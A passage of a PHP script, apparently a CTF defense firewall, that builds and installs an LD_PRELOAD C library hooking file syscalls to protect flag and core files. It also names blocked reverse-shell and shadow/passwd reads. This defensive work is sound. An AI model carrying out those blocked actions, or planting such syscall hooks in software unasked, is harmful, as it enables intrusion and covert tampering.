    if (is_protected(oldpath) || is_protected(newpath) ||
        (oldpath && strstr(oldpath, "flag"))) {
        pwaf_log("link", oldpath ? oldpath : "?"); errno = EPERM; return -1;
    }
    return real_link(oldpath, newpath);
}

// ── Hook: fopen (block write/truncate of protected files; allow append + read) ──
typedef FILE *(*real_fopen_t)(const char *, const char *);
FILE *fopen(const char *path, const char *mode) {
    real_fopen_t real_fopen = (real_fopen_t)dlsym(RTLD_NEXT, "fopen");
    if (!real_fopen) { errno = EACCES; return NULL; }
    if (path && mode && is_protected(path) &&
        (mode[0] == 'w' || (mode[0] == 'r' && strchr(mode, '+')))) {
        pwaf_log("fopen_w", path); errno = EPERM; return NULL;
    }
    return real_fopen(path, mode);
}

// ── Hook: unlinkat / renameat / fchmodat (modern rm/mv/chmod use *at variants) ──
typedef int (*real_unlinkat_t)(int, const char *, int);
int unlinkat(int dirfd, const char *pathname, int flags) {
    real_unlinkat_t real_unlinkat = (real_unlinkat_t)dlsym(RTLD_NEXT, "unlinkat");
    if (!real_unlinkat) { errno = EACCES; return -1; }
    if (is_protected(pathname)) { pwaf_log("unlinkat", pathname); errno = EPERM; return -1; }
    return real_unlinkat(dirfd, pathname, flags);
}
typedef int (*real_renameat_t)(int, const char *, int, const char *);
int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath) {
    real_renameat_t real_renameat = (real_renameat_t)dlsym(RTLD_NEXT, "renameat");
    if (!real_renameat) { errno = EACCES; return -1; }
    if (is_protected(oldpath)) { pwaf_log("renameat", oldpath); errno = EPERM; return -1; }
    return real_renameat(olddirfd, oldpath, newdirfd, newpath);
}
typedef int (*real_fchmodat_t)(int, const char *, mode_t, int);
int fchmodat(int dirfd, const char *pathname, mode_t mode, int flags) {
    real_fchmodat_t real_fchmodat = (real_fchmodat_t)dlsym(RTLD_NEXT, "fchmodat");
    if (!real_fchmodat) { errno = EACCES; return -1; }
    if (is_protected(pathname)) { pwaf_log("fchmodat", pathname); errno = EPERM; return -1; }
    return real_fchmodat(dirfd, pathname, mode, flags);
}

// ── Constructor ──
__attribute__((constructor))
static void pwaf_init(void) {
    setenv("PWAF_ACTIVE", "1", 1);
}
CSRC_BODY;

                file_put_contents($c_path, $c_source, LOCK_EX);
        echo "[+] Generated C source: $c_path\n";

                $compilers = array('gcc', 'cc', 'musl-gcc');
        $compiled = false;
        foreach ($compilers as $cc) {
            $gcc_cmd = "$cc -shared -fPIC -O2 -s"
                . " -DPWAF_LOG_PATH='\"" . addcslashes($log_path, '"\\') . "\"'"
                . " -DPWAF_WEBROOT='\"" . addcslashes($wr, '"\\') . "\"'"
                . " -o " . escapeshellarg($so_path) . " " . escapeshellarg($c_path) . " -ldl 2>&1";
            $output = array();
            $ret = 0;
            exec($gcc_cmd, $output, $ret);
            if ($ret === 0) {
                echo "[+] Compiled with $cc: $so_path\n";
                $compiled = true;
                break;
            }
        }

        if (!$compiled) {
            echo "[!] No compiler available (tried: " . implode(', ', $compilers) . ")\n";
            echo "[i] Install gcc: apt-get install -y gcc\n";
            echo "[i] C source kept at: $c_path\n";
            echo "[i] Compile manually:\n";
            echo "    gcc -shared -fPIC -O2 -s -DPWAF_LOG_PATH='\"$log_path\"' -DPWAF_WEBROOT='\"$wr\"' -o $so_path $c_path -ldl\n";
            return;
        }

                @unlink($c_path);
        echo "[+] Cleaned up C source\n";

                @chmod($so_path, 0755);
        $deployed = true;
    }

    if (!$deployed) {
        echo "[!] Failed to deploy waf.so via any strategy.\n";
        return;
    }

        $cfg['ldpreload_path'] = $so_path;
    $cfg['ldpreload_enabled'] = true;
    // Remove legacy base64 cache keys if present
    foreach (array_keys($cfg) as $k) {
        if (strpos($k, 'ldpreload_bin_') === 0) unset($cfg[$k]);
    }
    pwaf_save_cfg($cfg);
    echo "[+] Config updated: LD_PRELOAD enabled\n";

    echo "\n[*] Usage:\n";
    echo "    Method A (recommended): WAF auto-sets LD_PRELOAD at runtime\n";
    echo "    Method B: export LD_PRELOAD=$so_path\n";
    echo "    Method C: Add to php.ini or php-fpm pool config:\n";
    echo "              env[LD_PRELOAD] = $so_path\n";
    echo "\n[*] Hooked syscalls:\n";
    echo "    + execve   - blocks dangerous command execution (flag/shadow/passwd/reverse shell)\n";
    echo "    + unlink   - prevents deletion of WAF core files\n";
    echo "    + rename   - prevents renaming of protected files\n";
    echo "    + chmod    - prevents stripping permissions on protected files\n";
    echo "    + remove   - prevents remove() on protected files\n";
    echo "    + truncate - prevents truncating protected files to zero\n";
    echo "    + symlink  - blocks symlinking flag/protected files (read bypass)\n";
    echo "    + link     - blocks hardlinking protected files\n";
    echo "    + fopen    - blocks opening protected files in write/truncate mode\n";
    echo "    + *at      - unlinkat/renameat/fchmodat (modern rm/mv/chmod path)\n";
}
